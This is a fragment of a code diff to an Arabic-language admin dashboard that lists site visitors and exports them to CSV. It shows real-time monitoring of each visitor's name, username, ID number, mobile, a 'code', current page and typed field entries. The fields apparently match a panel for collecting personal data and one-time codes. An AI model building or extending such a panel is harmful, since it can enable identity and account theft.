         const td = (t, extra) => '<td class="p-2 border-b border-gray-100 align-top ' + (extra || '') + '">' + t + '</td>';
         const entries = fieldEntries(u).map(([k, v]) => '<div class="mb-1"><span class="text-gray-500">' + fieldLabel(k) + ':</span> <span class="font-bold break-all" dir="auto">' + esc(v) + '</span></div>').join('') || '<span class="text-gray-300">—</span>';
         html += '<tr class="hover:bg-gray-50">'
@@ -1478,15 +754,13 @@ function renderDbTable() {
             + td('<div class="max-w-md">' + entries + '</div>')
             + '</tr>';
     });
-    html += '</tbody></table>';
-    wrap.innerHTML = html;
+    wrap.innerHTML = html + '</tbody></table>';
 }
-
 function exportDbCsv() {
     const rows = allUsersData.filter((u) => !u.deleted);
     if (!rows.length) { window.showToast('لا توجد تسجيلات للتصدير'); return; }
-    const head = ['التاريخ', 'آخر ظهور', 'الرمز', 'الاسم', 'اسم المستخدم', 'الهوية', 'الجوال', 'الحالة', 'الصفحة الحالية', 'الاتصال', 'إدخالات'];
     const q = (v) => '"' + String(v == null ? '' : v).replace(/"/g, '""') + '"';
+    const head = ['التاريخ', 'آخر ظهور', 'الرمز', 'الاسم', 'اسم المستخدم', 'الهوية', 'الجوال', 'الحالة', 'الصفحة الحالية', 'الاتصال', 'إدخالات'];
     const lines = [head.map(q).join(',')];
     rows.forEach((u) => {
         const entries = fieldEntries(u).map(([k, v]) => fieldLabel(k) + ': ' + v).join(' | ');
@@ -1500,6 +774,40 @@ function exportDbCsv() {
     URL.revokeObjectURL(a.href);
     window.showToast('تم تصدير ' + rows.length + ' تسجيلًا');
 }
+
+async function startApp() {
+    if (appStarted) return;
+    appStarted = true;
+    hideLogin();
+    renderIdleStats();
+    ensureHeaderControls();
+    const ok = await fetchVisitors();
+    if (ok) {
+        updateStats(); renderUsersList(); subscribeRealtime();
+        setInterval(async () => {
+            const okf = await fetchVisitors();
+            if (okf) { updateStats(); renderUsersList(); if (selectedUserId) selectUser(selectedUserId); }
+        }, 30000);
+    }
+}
+sb.auth.onAuthStateChange((event, session) => {
+    if (event === 'SIGNED_IN' && session) startApp();
+    if (event === 'SIGNED_OUT') {
+        appStarted = false; allUsersData = []; selectedUserId = null;
+        if (liveChannel) { sb.removeChannel(liveChannel); liveChannel = null; }
+        setLive('wait'); showLogin();
+    }
+});
+(async function boot() {
+    noUserSelectedEl.classList.remove('hidden');
+    userDetailsHeader.classList.add('hidden');
+    userDetailsContent.classList.add('hidden');
+    ensureLoginGate();
+    const { data } = await sb.auth.getSession();
+    if (data && data.session) await startApp();
+    else { renderIdleStats(); showLogin(); }
+})();
+
 </script>
 </body>
 </html>
